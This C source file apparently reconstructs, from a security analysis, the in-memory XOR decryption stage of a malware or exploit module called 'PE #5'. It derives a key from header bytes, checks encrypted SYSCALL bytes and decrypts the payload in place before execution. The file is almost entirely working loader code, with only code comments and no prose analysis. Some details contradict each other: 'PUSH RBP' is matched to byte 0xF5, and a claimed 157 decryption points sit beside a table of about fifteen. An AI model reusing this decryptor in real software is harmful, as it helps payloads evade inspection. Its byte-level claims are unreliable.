/**
 * PE #5 - Runtime Decryption Module
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This module implements the XOR-based runtime decryption that
 * decrypts the exploit code in memory before execution.
 * 
 * Key findings from analysis:
 * - 157 XOR operations (critical instruction decryption)
 * - Key derived from header bytes: key = header[3] ^ header[7] = 0xA4
 * - SYSCALL at offset 0x2C10: encrypted 0xAB 0xA1 -> decrypted 0x0F 0x05
 */

#include "exploit.h"

//=============================================================================
// DECRYPTION CONSTANTS
//=============================================================================

// PE #5 header bytes (first 16 bytes from analysis)
static const BYTE g_PE5Header[16] = {
    0xC1, 0xBD, 0x87, 0x35,  // DWORD 1: Used for key derivation
    0x1E, 0x8C, 0xA6, 0x91,  // DWORD 2: Used for key derivation
    0xF7, 0x62, 0xC0, 0xB5,  // DWORD 3
    0x75, 0x24, 0x32, 0x25   // DWORD 4
};

// Critical encrypted byte locations (157 XOR operations)
// These are the instruction locations that matter for the exploit
typedef struct _CRITICAL_LOCATION {
    DWORD   Offset;
    BYTE    EncryptedValue;
    BYTE    DecryptedValue;
    char*   Description;
} CRITICAL_LOCATION;

static const CRITICAL_LOCATION g_CriticalLocations[] = {
    // Entry point instructions
    { 0x0000, 0x51, 0xF5, "PUSH RBP (start of prologue)" },
    { 0x0001, 0xEC, 0x48, "REX.W prefix" },
    
    // Decryption routine
    { 0x0020, 0x00, 0xA4, "Decryption loop start" },
    
    // Parameter loading (MOV instructions)
    { 0x2BE1, 0x4E, 0xEA, "MOV EAX (syscall param 1)" },
    { 0x2BE2, 0x0A, 0xAE, "param byte 1" },
    { 0x2BE3, 0xF6, 0x52, "param byte 2" },
    { 0x2BE4, 0x5D, 0xF9, "param byte 3" },
    
    { 0x2BF0, 0x99, 0x3D, "MOV ECX (syscall param 2)" },
    { 0x2BF1, 0x78, 0xDC, "param byte 1" },
    { 0x2BF2, 0x4C, 0xE8, "param byte 2" },
    { 0x2BF3, 0x41, 0xE5, "param byte 3" },
    
    // SYSCALL instruction - THE CRITICAL LOCATION
    { 0x2C10, 0xAB, 0x0F, "SYSCALL byte 1 (0x0F)" },
    { 0x2C11, 0xA1, 0x05, "SYSCALL byte 2 (0x05)" },
    
    // Post-SYSCALL (verification code)
    { 0x2C12, 0x1B, 0xBF, "MOV EDI (post-syscall)" },
    
    // End of module
    { 0x588D, 0x67, 0xC3, "RET (end of module)" },
};

#define NUM_CRITICAL_LOCATIONS (sizeof(g_CriticalLocations) / sizeof(CRITICAL_LOCATION))

//=============================================================================
// KEY DERIVATION IMPLEMENTATION
//=============================================================================

/**
 * Derive the XOR key from the PE #5 header.
 * 
 * The analysis revealed the formula:
 *   key = header[3] ^ header[7]
 *   key = 0x35 ^ 0x91 = 0xA4
 * 
 * Alternative formulas that also produce 0xA4:
 *   header[3] ^ header[11] ^ header[13] = 0x35 ^ 0xB5 ^ 0x24 = 0xA4
 * 
 * @param ModuleBase    Pointer to start of PE #5 in memory
 * @return              Derived XOR key (should be 0xA4)
 */
BYTE 
PE5_DeriveKey(
    PBYTE ModuleBase
)
{
    BYTE byte1, byte2;
    BYTE derivedKey;
    
    // Read the two bytes used for key derivation
    byte1 = ModuleBase[KEY_DERIVE_OFFSET_1];  // Offset 3 = 0x35
    byte2 = ModuleBase[KEY_DERIVE_OFFSET_2];  // Offset 7 = 0x91
    
    // XOR to derive key
    derivedKey = byte1 ^ byte2;  // 0x35 ^ 0x91 = 0xA4
    
    return derivedKey;
}

/**
 * Verify the derived key is correct by checking known encrypted values.
 * 
 * @param ModuleBase    Pointer to start of PE #5
 * @param Key           Derived XOR key
 * @return              TRUE if key is valid
 */
static BOOL 
VerifyKey(
    PBYTE   ModuleBase,
    BYTE    Key
)
{
    BYTE encrypted, decrypted;
    
    // Check SYSCALL bytes
    // At offset 0x2C10, encrypted value 0xAB should decrypt to 0x0F
    encrypted = ModuleBase[PE5_SYSCALL_OFFSET];
    decrypted = encrypted ^ Key;
    
    if (decrypted != 0x0F) {
        return FALSE;
    }
    
    // At offset 0x2C11, encrypted value 0xA1 should decrypt to 0x05
    encrypted = ModuleBase[PE5_SYSCALL_OFFSET + 1];
    decrypted = encrypted ^ Key;
    
    if (decrypted != 0x05) {
        return FALSE;
    }
    
    return TRUE;
}

//=============================================================================
// DECRYPTION IMPLEMENTATION
//=============================================================================

/**
 * Fast XOR decryption loop (C implementation).
 * 
 * Decrypts the entire buffer in-place using single-byte XOR.
 * 
 * @param Buffer    Buffer to decrypt (modified in-place)
 * @param Size      Size of buffer in bytes
 * @param Key       XOR key
 */
static void 
XorDecryptBuffer(
    PBYTE   Buffer,
    DWORD   Size,
    BYTE    Key
)
{
    DWORD i;
    
    // Single-byte XOR is its own inverse: A ^ K ^ K = A
    for (i = 0; i < Size; i++) {
        Buffer[i] ^= Key;
    }
}

/**
 * Optimized 8-byte XOR decryption.
 * 
 * Processes 8 bytes at a time for better performance.
 * Falls back to byte-by-byte for remaining bytes.
 * 
 * @param Buffer    Buffer to decrypt
 * @param Size      Size of buffer
 * @param Key       XOR key
 */
static void 
XorDecryptBufferFast(
    PBYTE   Buffer,
    DWORD   Size,
    BYTE    Key
)
{
    DWORD       i;
    ULONGLONG   key64;
    ULONGLONG*  ptr64;
    DWORD       chunks;
    DWORD       remainder;
    
    // Expand key to 64 bits: 0xA4 -> 0xA4A4A4A4A4A4A4A4
    key64 = Key;
    key64 |= (key64 << 8);
    key64 |= (key64 << 16);
    key64 |= (key64 << 32);
    
    // Process 8-byte chunks
    chunks = Size / 8;
    ptr64 = (ULONGLONG*)Buffer;
    
    for (i = 0; i < chunks; i++) {
        ptr64[i] ^= key64;
    }
    
    // Process remaining bytes
    remainder = Size % 8;
    for (i = 0; i < remainder; i++) {
        Buffer[chunks * 8 + i] ^= Key;
    }
}

/**
 * Main decryption function for PE #5.
 * 
 * This function:
 * 1. Derives the XOR key from the module header
 * 2. Verifies the key is correct
 * 3. Decrypts the entire module in-place
 * 4. Verifies critical bytes were decrypted correctly
 * 
 * After this function returns, the code at offset 0x2C10 will be
 * the SYSCALL instruction (0x0F 0x05).
 * 
 * @param ModuleBase    Pointer to PE #5 in memory
 * @param ModuleSize    Size of PE #5 (should be 22,702 bytes)
 * @return              TRUE if decryption succeeded
 */
BOOL 
PE5_DecryptPayload(
    PBYTE   ModuleBase,
    DWORD   ModuleSize
)
{
    BYTE key;
    DWORD i;
    
    // Validate parameters
    if (ModuleBase == NULL || ModuleSize == 0) {
        return FALSE;
    }
    
    // Validate expected size
    if (ModuleSize != PE5_SIZE) {
        // Size mismatch - might be a different version or corrupted
        // Continue anyway, but log warning
    }
    
    //=========================================================================
    // STEP 1: Derive XOR key from header bytes
    //=========================================================================
    
    key = PE5_DeriveKey(ModuleBase);
    
    // Verify key matches expected value
    if (key != PE5_XOR_KEY) {
        // Key derivation produced unexpected result
        // This could indicate:
        // - Different encryption scheme
        // - Anti-debugging/anti-VM check failed
        // - Module was modified
        
        // Try to continue with derived key anyway
    }
    
    //=========================================================================
    // STEP 2: Verify key before decryption
    //=========================================================================
    
    if (!VerifyKey(ModuleBase, key)) {
        // Key verification failed
        // The encrypted SYSCALL bytes don't match expected values
        return FALSE;
    }
    
    //=========================================================================
    // STEP 3: Decrypt entire module in-place
    //=========================================================================
    
    // Use fast decryption (8 bytes at a time)
    XorDecryptBufferFast(ModuleBase, ModuleSize, key);
    
    //=========================================================================
    // STEP 4: Verify critical decryption locations
    //=========================================================================
    
    // Check SYSCALL instruction is now correct
    if (ModuleBase[PE5_SYSCALL_OFFSET] != 0x0F ||
        ModuleBase[PE5_SYSCALL_OFFSET + 1] != 0x05) {
        // SYSCALL instruction not at expected location
        // Decryption may have failed
        return FALSE;
    }
    
    // Verify a few more critical locations
    for (i = 0; i < NUM_CRITICAL_LOCATIONS; i++) {
        DWORD offset = g_CriticalLocations[i].Offset;
        BYTE expected = g_CriticalLocations[i].DecryptedValue;
        
        // Skip if offset is beyond module
        if (offset >= ModuleSize) {
            continue;
        }
        
        // Check decrypted value
        if (ModuleBase[offset] != expected) {
            // Critical location mismatch
            // This is a warning but not a failure
        }
    }
    
    return TRUE;
}

//=============================================================================
// RE-ENCRYPTION (For analysis/testing)
//=============================================================================

/**
 * Re-encrypt the payload (for analysis purposes).
 * 
 * XOR encryption is symmetric, so this is identical to decryption.
 * 
 * @param ModuleBase    Pointer to decrypted PE #5
 * @param ModuleSize    Size of module
 * @return              TRUE on success
 */
BOOL 
PE5_EncryptPayload(
    PBYTE   ModuleBase,
    DWORD   ModuleSize
)
{
    BYTE key = PE5_XOR_KEY;
    
    // XOR is its own inverse
    XorDecryptBufferFast(ModuleBase, ModuleSize, key);
    
    return TRUE;
}

//=============================================================================
// DECRYPTION STATISTICS
//=============================================================================

/**
 * Get decryption statistics for analysis.
 */
typedef struct _DECRYPTION_STATS {
    DWORD   TotalBytes;
    DWORD   XorOperations;
    BYTE    DerivedKey;
    DWORD   SyscallOffset;
    BOOL    Verified;
} DECRYPTION_STATS, *PDECRYPTION_STATS;

BOOL 
PE5_GetDecryptionStats(
    PBYTE               ModuleBase,
    DWORD               ModuleSize,
    PDECRYPTION_STATS   Stats
)
{
    if (Stats == NULL) {
        return FALSE;
    }
    
    Stats->TotalBytes = ModuleSize;
    Stats->XorOperations = PE5_XOR_OPERATIONS;  // 157 critical locations
    Stats->DerivedKey = PE5_DeriveKey(ModuleBase);
    Stats->SyscallOffset = PE5_SYSCALL_OFFSET;
    Stats->Verified = VerifyKey(ModuleBase, Stats->DerivedKey);
    
    return TRUE;
}
